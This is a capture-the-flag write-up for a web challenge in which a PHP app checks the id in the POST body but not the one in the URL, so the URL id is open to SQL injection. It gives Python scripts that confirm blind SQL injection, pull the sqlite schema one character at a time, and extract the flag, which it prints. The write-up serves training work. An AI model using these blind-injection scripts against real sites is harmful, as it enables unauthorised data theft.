# ## The team

**Author:** randN
**Category:** web
**Difficulty:** medium

## Description
```
The students created a web app to present the course team, but sanitizing PHP inputs is hard. Are you able to help us finding the mistake?
```

## Solve

Looking into the page provided we are presented with a list of records that have some hyperlinks, but only the **View Record** works. Accessing one record:

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/web/the_team/images/view_record.png?raw=true)

A **POST** request is executed, which is quite odd. Analysing the source code of the home page, we can see that all the view records have a form that executes a **POST**, and sends a url parameter at the same time.

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/web/the_team/images/home_records.png?raw=true)

Fuzzing the url parameter with _sqlmap_ gives no results. Doing the same with a **POST** request sending **id=1** in the body also gives no results. The description talks about wrong sanitization, so there must be a validation put in place that uses  **PHP** HTTP GET variable (\$\_GET) and HTTP POST variable (\$\_POST) to validate input.

Let's try something to check this theory:

``` python
import requests
import urllib

payload = urllib.parse.quote_plus(' and 1 = 2')
r = requests.post('http://ctf-metared-2021.ua.pt:24003/read.php?id=1'+payload, data={'id':1})
print(r.text)
```

If we execute this python script the page presented will not bring the information for the record with **id=1**. But if we send ** and 1 = 1** we get the record, so there is a _Blind SQL injection_ vulnerability present.

Now we just need to elaborate the script more. First, let's try get information about the tables. By trial and error, we will see that the DBMS is sqlite.

```python
import urllib
import string

# Get the sql from the tables
result = ''
count = 0
offset = 0

while True:
    for char in string.printable:
        position = len(result) + 1
        payload = f" AND '{char}' IN (SELECT SUBSTR(sql,{position},1) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET {offset})"
        payload = urllib.parse.quote_plus(payload)
        r = requests.post('http://ctf-metared-2021.ua.pt:24003/read.php?id=1'+payload, data={'id':1})
        if 'randN' in r.text:
            result += char
            print(result)
            count = 0
        else:
            count += 1
    if count >= 200:
        print(f'Table name: {result} Offset: {offset}')
        result = ''
        offset +=1

```

This will give us the information about the tables.

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/web/the_team/images/tables.png?raw=true)

Now we just need to get the flag:

```python
import urllib
import string

# Get the sql from the tables
result = ''
count = 0
offset = 0

while True:
    for char in string.printable:
        position = len(result) + 1
        payload = f" AND '{char}' IN (SELECT SUBSTR(flag,{position},1) FROM flag)"
        payload = urllib.parse.quote_plus(payload)
        r = requests.post('http://ctf-metared-2021.ua.pt:24003/read.php?id=1'+payload, data={'id':1})
        if 'randN' in r.text:
            result += char
            print(result)

```

## Flag
CTFUA{SqLi_is_still_4_th1ng}
